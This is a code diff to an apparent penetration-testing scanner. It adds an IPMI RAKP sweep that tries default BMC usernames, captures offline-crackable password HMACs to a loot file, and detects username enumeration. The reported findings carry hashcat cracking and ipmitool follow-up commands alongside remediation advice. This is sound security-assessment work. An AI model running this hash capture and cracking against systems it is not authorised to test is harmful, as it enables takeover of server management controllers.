@@ -198,6 +198,83 @@ def _hashcat_rakp_line(username: str, client_random: bytes, server_random: bytes
     return f"{data.hex()}:{hmac.hex()}"
 
 
+# Common BMC default usernames. Order matters: root first (Sun/Dell/legacy
+# defaults), then vendor-neutral admin, then the notable per-vendor ones.
+# USERID is IBM's factory default; ADMIN is Supermicro; sysadmin covers HP
+# and some Cisco UCS. The sweep stops at 8 candidates by default so a scan
+# of a /24 with BMCs on it does not turn into ~2000 RAKP round-trips.
+_DEFAULT_RAKP_USERS = ("root", "admin", "ADMIN", "Administrator",
+                       "USERID", "sysadmin", "operator", "user")
+
+
+def rakp_sweep(ip: str, port: int = _DEFAULT_PORT,
+               usernames=_DEFAULT_RAKP_USERS,
+               timeout: float = _TIMEOUT,
+               algs=(_AUTH_HMAC_SHA1, _AUTH_HMAC_SHA256)) -> dict:
+    """Multi-user + multi-algorithm RAKP hash capture.
+
+    For each (algorithm, username) pair, run one RMCP+ Open Session + RAKP1/
+    RAKP2 exchange and collect the captured HMAC. Every real IPMI 2.0 BMC
+    returns a hash for ANY username — existing or not — so the sweep is
+    conservative on request count and treats a refusal on the first user of
+    an algorithm as "this BMC doesn't offer that algorithm" and skips the
+    rest for that algorithm.
+
+    Also detects the BMC's username-enumeration behaviour: some BMCs return
+    status 0x0D "invalid role" for unknown users vs. proceeding for valid
+    ones — when that asymmetry appears, `existing_users` names the valid
+    ones and the finding surfaces it separately.
+
+    Returns:
+      {reachable, hashes: [{user, alg, mode, hashcat_line}],
+       existing_users: [str], distinguishes_users: bool, errors: [str]}
+    """
+    out: dict = {"reachable": False, "hashes": [], "existing_users": [],
+                 "distinguishes_users": False, "errors": []}
+    alg_status: dict = {}                       # per-alg: True if it produced ANY hash
+
+    for alg in algs:
+        alg_status[alg] = False
+        for user in usernames:
+            r = rakp_hash(ip, port, username=user, timeout=timeout, auth_alg=alg)
+            if r["reachable"]:
+                out["reachable"] = True
+            # Skip the rest of THIS algorithm's users when the first refused —
+            # a BMC that doesn't offer HMAC-SHA256 will refuse every user.
+            if not r["hashcat_line"]:
+                if not alg_status[alg]:
+                    if r["error"]:
+                        out["errors"].append(f"{user}/{r.get('hmac_alg') or f'alg{alg}'}: "
+                                             f"{r['error']}")
+                    break                       # first user refused → skip alg
+                # Later user refused with existing hits — legitimate signal
+                # about user validity.
+                continue
+            alg_status[alg] = True
+            cat = "ipmi-sha256" if alg == _AUTH_HMAC_SHA256 else "ipmi"
+            out["hashes"].append({
+                "user": user,
+                "alg": r["hmac_alg"],
+                "mode": r["hashcat_mode"],
+                "hashcat_line": r["hashcat_line"],
+                "category": cat,
+            })
+
+    # Username enumeration: if the BMC returned a hash for SOME users but
+    # refused others (with a specific "invalid role" status), that is
+    # information disclosure — legitimate accounts are named.
+    users_with_hash = {h["user"] for h in out["hashes"]}
+    users_refused = set()
+    for e in out["errors"]:
+        u = e.split("/", 1)[0]
+        if u not in users_with_hash:
+            users_refused.add(u)
+    if users_with_hash and users_refused:
+        out["distinguishes_users"] = True
+        out["existing_users"] = sorted(users_with_hash)
+    return out
+
+
 def rakp_hash(ip: str, port: int = _DEFAULT_PORT, username: str = "admin",
               timeout: float = _TIMEOUT,
               auth_alg: int = _AUTH_HMAC_SHA1) -> dict:
@@ -328,14 +405,14 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
     else:
         out["ipmi_version"] = "1.5"
     # RAKP hash capture, only meaningful on IPMI 2.0. Best-effort: any failure
-    # (server refuses, no auth-alg match, timeout) leaves out["rakp"] empty and
-    # findings() reports nothing new. The GCAC probe above is what confirms the
-    # port; this is the additional value.
+    # (server refuses, no auth-alg match, timeout) leaves out["rakp_sweep"]
+    # empty and findings() reports nothing new. The GCAC probe above is what
+    # confirms the port; this is the additional value.
     if out["ipmi_20"]:
         try:
-            rakp = rakp_hash(ip, port, timeout=timeout)
-            if rakp.get("hashcat_line"):
-                out["rakp"] = rakp
+            sweep = rakp_sweep(ip, port, timeout=timeout)
+            if sweep.get("hashes"):
+                out["rakp_sweep"] = sweep
         except OSError:
             pass
     return out
@@ -416,32 +493,65 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     ["CWE-327", "CWE-916"], kind="ipmi_weak_auth"))
             # RAKP hash capture (CVE-2013-4805 class — the design of RMCP+ leaks
             # a crackable HMAC to any client that starts the exchange). Fires
-            # only when recce actually captured the HMAC — every real IPMI 2.0
+            # only when recce actually captured a hash — every real IPMI 2.0
             # deployment does this, so a missing finding here is a probe error,
             # not a hardened BMC.
-            rakp = pr.get("rakp") or {}
-            if rakp.get("hashcat_line"):
+            sweep = pr.get("rakp_sweep") or {}
+            hashes = sweep.get("hashes") or []
+            if hashes:
+                # Group captures by hashcat mode so the operator sees which
+                # loot file(s) got written.
+                # Avoid `for h in hashes` — `h` is the outer host loop var and
+                # rebinding it here breaks `h.ip` in the finding text below.
+                by_mode: dict[int, list[str]] = {}
+                for _hash_entry in hashes:
+                    by_mode.setdefault(_hash_entry["mode"], []).append(
+                        _hash_entry["user"])
+                mode_txt = "; ".join(
+                    f"-m {m} for {len(users)} user(s) ({', '.join(sorted(set(users)))})"
+                    for m, users in sorted(by_mode.items()))
+                first_mode = min(by_mode)
                 out.append(_finding(
                     "high",
-                    "IPMI RAKP hash captured (RMCP+ password HMAC is offline-crackable)",
+                    "IPMI RAKP hashes captured (RMCP+ password HMAC is offline-crackable)",
                     tgt,
-                    f"An RMCP+ Open Session + RAKP1 exchange with the BMC returned "
-                    f"a {rakp.get('hmac_alg', 'HMAC')} in RAKP Message 2 that is "
-                    f"computed with the target user's password as the key. Any "
-                    f"IPMI 2.0 BMC leaks this to any client that starts the "
-                    f"exchange (design of the protocol, not a misconfiguration) "
-                    f"— crack the hash offline with hashcat -m "
-                    f"{rakp.get('hashcat_mode')} against a wordlist to recover "
-                    f"the BMC password. recce wrote the captured line to "
-                    f"loot/ipmi.hash.",
-                    f"hashcat -m {rakp.get('hashcat_mode')} loot/ipmi.hash "
-                    "wordlist.txt   # then: ipmitool -H {ip} -U <user> -P "
-                    "<cracked> user list",
+                    f"RMCP+ Open Session + RAKP1 exchange(s) with the BMC returned "
+                    f"{len(hashes)} crackable HMAC(s): {mode_txt}. The HMAC in "
+                    f"RAKP Message 2 is computed with the target user's password "
+                    f"as the key. ANY IPMI 2.0 BMC leaks this to ANY client that "
+                    f"starts the exchange — design of the protocol, not a "
+                    f"misconfiguration. Recce wrote the captured lines to "
+                    f"loot/ipmi*.hash.",
+                    f"hashcat -m {first_mode} loot/ipmi.hash wordlist.txt   "
+                    f"# then: ipmitool -H {h.ip} -U <user> -P <cracked> user list",
                     "There is no protocol-level fix — restrict IPMI to a dedicated "
                     "management network and enforce a password policy strong "
                     "enough that offline cracking is infeasible (16+ char "
                     "high-entropy).",
                     ["CWE-916", "CWE-522"], kind="ipmi_rakp_hash"))
+
+                # Username enumeration: some BMCs answer differently for valid
+                # vs invalid users, so the sweep's success/failure map tells
+                # the tester which accounts actually exist. That is a separate,
+                # lower-severity finding on top of the crackable-hash one.
+                if sweep.get("distinguishes_users") and sweep.get("existing_users"):
+                    valid = sweep["existing_users"]
+                    out.append(_finding(
+                        "medium",
+                        "IPMI username enumeration via RAKP status codes", tgt,
+                        f"The BMC answered RAKP1 for some usernames and REFUSED "
+                        f"others with 'invalid role' — a scanner can distinguish "
+                        f"valid accounts from invalid ones. Valid users named by "
+                        f"the sweep: {', '.join(valid)}. Combined with the "
+                        f"captured RAKP hash for each, an attacker can focus "
+                        f"crack effort on the accounts that actually exist.",
+                        f"ipmitool -H {h.ip} -I lanplus user list   "
+                        "# for the credentialed cross-check",
+                        "Configure the BMC to return the same reply for existing "
+                        "and missing users (vendor-specific: iDRAC 'lockdown', "
+                        "iLO 'user account privacy'). Restricting IPMI to the "
+                        "management network remains the primary control.",
+                        ["CWE-204", "CWE-200"], kind="ipmi_user_enum"))
 
             # Always emit an info-level fingerprint so IPMI presence is in the report.
             out.append(_finding(
